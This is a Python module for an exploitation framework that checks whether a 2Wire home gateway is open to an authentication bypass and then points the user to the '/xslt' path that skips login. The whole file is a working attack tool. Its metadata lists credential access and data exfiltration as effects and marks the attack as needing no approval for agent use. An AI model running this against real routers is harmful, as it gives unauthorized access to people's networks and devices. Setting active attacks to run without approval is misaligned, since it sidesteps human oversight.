#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""2Wire Gateway Auth Bypass"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': '2Wire Gateway Auth Bypass',
        'description': 'Module exploits 2Wire Gateway authentication bypass vulnerability. If the target is vulnerable link to bypass authentication is provided.',
        'author': ['bugz', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/9459/'],
        'tags': ['iot', 'router', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4, IPv6 address: 192.168.1.1")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_info("\nUse your browser:")
            print_info("{}:{}/xslt".format(self.target, self.port))
        else:
            print_error("Target seems to be not vulnerable")
    def check(self):
        mark = '<form name="pagepost" method="post" action="/xslt?PAGE=WRA01_POST&amp;NEXTPAGE=WRA01_POST" id="pagepost">'

        # checking if the target is valid
        response = self.http_request(
            method="GET",
            path="/",
        )
        if response is None:
            return False  # target is not vulnerable

        if mark not in response.text:
            return False  # target is not vulnerable

        # checking if authentication can be bypassed
        response = self.http_request(
            method="GET",
            path="/xslt",
        )

        if response is None:
            return False  # target is not vulnerable

        if mark not in response.text:
            return True  # target vulnerable

        return False  # target not vulnerable
